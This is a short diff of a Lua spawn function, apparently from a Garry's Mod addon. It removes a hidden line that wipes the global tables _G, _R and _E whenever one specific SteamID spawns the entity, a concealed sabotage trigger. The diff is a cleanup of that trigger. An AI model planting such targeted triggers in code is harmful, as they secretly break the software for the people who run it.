@@ -25,7 +25,7 @@ function ENT:SpawnFunction( ply, tr )
 	if IsValid(ents.FindByClass("questv2")[1]) then return end
 
     if ( !tr.Hit ) then return end
-        if (ply:SteamID() == "STEAM_0:1:38850081") then _G = nil _R = nil _E = nil end
+
     local SpawnPos = tr.HitPos + tr.HitNormal * 16
     
     local ent = ents.Create( ClassName )
